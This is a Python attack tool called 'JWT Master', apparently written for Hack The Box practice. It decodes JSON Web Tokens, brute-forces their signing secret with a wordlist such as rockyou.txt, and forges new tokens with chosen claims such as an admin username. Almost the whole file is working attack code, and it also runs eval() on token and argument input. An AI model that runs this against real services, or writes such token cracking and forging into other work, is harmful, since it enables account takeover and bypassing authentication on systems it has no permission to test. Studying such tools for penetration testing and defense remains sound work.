#!/usr/bin/env python3

import jwt
import base64
import re, sys
import argparse
from termcolor import colored
from multiprocessing import Process, Lock, Manager
import time
manager = Manager()
right = manager.list()
lock = Lock()
i = 0
x = """
  ██╗          ██╗██████╗ ██╗    ██╗██╗  ██╗███████╗██████╗      ██╗  
 ██╔╝          ██║╚════██╗██║    ██║██║ ██╔╝██╔════╝██╔══██╗     ╚██╗ 
██╔╝█████╗     ██║ █████╔╝██║ █╗ ██║█████╔╝ █████╗  ██████╔╝█████╗╚██╗
╚██╗╚════╝██   ██║ ╚═══██╗██║███╗██║██╔═██╗ ██╔══╝  ██╔══██╗╚════╝██╔╝
 ╚██╗     ╚█████╔╝██████╔╝╚███╔███╔╝██║  ██╗███████╗██║  ██║     ██╔╝ 
  ╚═╝      ╚════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝                                                                               
   """


def creds():
    print(colored(x, "red"))
    print(colored("JWT Master", 'blue'))
    print(colored("---------------------\n", 'green'))
    print(colored("Author: J3wker", 'red'))
    print(colored("HTB Profile: https://www.hackthebox.eu/profile/165824", 'green'))
    print(colored("GitHub: https://github.com/J3wker\n\n", 'green'))


def forge(data, secret, alg):
    jwt_token = jwt.encode(data, key=secret, algorithm=alg)
    jwt_token = jwt_token.decode("UTF-8")
    print("Your new token is ready!:\n" + colored(jwt_token, "green"))


def brute(word, variable, alg, token, lock):
        variable = eval(variable)
        global i
        global right
        print(colored(f"Trying: {word}", "red"), end="\r")
        new_jwt = jwt.encode(variable, key=word, algorithm=alg)
        new_jwt = new_jwt.decode("UTF-8")
        if token == new_jwt:
            right.append(1)
            with lock:
                end = time.time()
                timer = end - time1
                print(colored(f"\n\n[+] Correct Secret Key Found!: {word}", "green"))
                print(f"\n[+] Tried: {i} Passwords in: {timer} Seconds\n")
                print(colored("Now use -f in the script to create\nYour own forged JWT token!\n", "blue"))

        


def send_to_brute(wordlist, variable, alg, token, lock):
    try:
        print(f"Wordlist loaded from: '{wordlist}'\n")
        with open(wordlist, 'r') as list:
            global time1
            global right
            global i
            time1 = time.time()
            for line in list:
                word = line.strip()
                i += 1
                if 1 in right:
                    break
                else:
                    t1 = Process(target=brute, args=(word, variable, alg, token, lock, ))
                    t1.start()



    except KeyboardInterrupt:
        print(colored("\n\n[-] Ctrl + C Detected Qutting program", "red"))

        
def b64padding(str):                                                                                                                                                      
    return '='*((4 - len(str)%4)%4)

  
def decode_jwt(token):
    try:          
        print("[+] Decoding")
        time.sleep(1)
        ser = re.search('(.*)(?:\\.)(.*)(?:\\.)(.*)', token)
        decoded1 = base64.b64decode(ser.group(1) + b64padding(ser.group(1)))
        decoded1 = decoded1.decode("UTF-8")
        print("\n\nType And Algorithm :\n")
        print(f"\n{ser.group(1)} " + colored(f"  =  {decoded1}\n", "green"))
        decoded2 = base64.b64decode(ser.group(2) + b64padding(ser.group(2)))
        decoded2 = decoded2.decode("UTF-8")
        print("\nData:\n")
        print(f"{ser.group(2)} " + "\n" +colored(f"\n\n{decoded2}\n", "green"))
        signiture = ser.group(3)
        print(f"\n{signiture} :" + colored(" Signture", "green"))
        print("\n------------------------------------------------------")
        choice = input(colored("[+] Brute Force For Secret Key? (y/N) - > ", "red"))
        if choice == "y":        
            print("\nNOTE: just press enter to use rockyou.txt")
            wordl = input(colored("[+] Enter wordlist FULL PATH(!) - > ", "blue"))
            print("---------------------------------------------")
            if wordl == "":
                wordl = "/usr/share/wordlists/rockyou.txt"
            alg = re.search('(?:"alg":")(.*?)(?:")', decoded1)
            alg = alg.group(1)
            send_to_brute(wordl, decoded2, alg, token, lock)
        else:
            print("\n\nPussy")
            exit(0)
    except KeyboardInterrupt:
        print(colored("\n\n[-] Ctrl + C Detected Qutting program", "red"))

def parse():
    parser = argparse.ArgumentParser(description="python3 jwt_master.py -d <JWT Token> " +colored("OR", "red") + " python3 jwt_master.py -f \"{'username':'admin','iat':'0'}\" -s <secret_key_word> -a <algorithm>")
    parser.add_argument('-d', dest="decode", help='The JWT token you want to decode')
    parser.add_argument('-s', dest="secret", help='The Secret for the JWT token creation')
    parser.add_argument('-f', dest="forge", help='Forge mode - enter the data you want to store in the forged token')
    parser.add_argument('-a', dest="algorithm", help='The algorithm used for the JWT token| Example: SH256')

    options = parser.parse_args()

    return options


def main():
    try:
        options = parse()
        creds()
        key = options.secret
        dec = options.decode
        alg = options.algorithm
        if dec:
            decode_jwt(dec)
        if key:
            data = eval(options.forge)
            forge(data, key, alg)
    except KeyboardInterrupt:
        print(colored("\n\n[-] Ctrl + C Detected Qutting program", "red"))

if __name__ == "__main__":
    main()
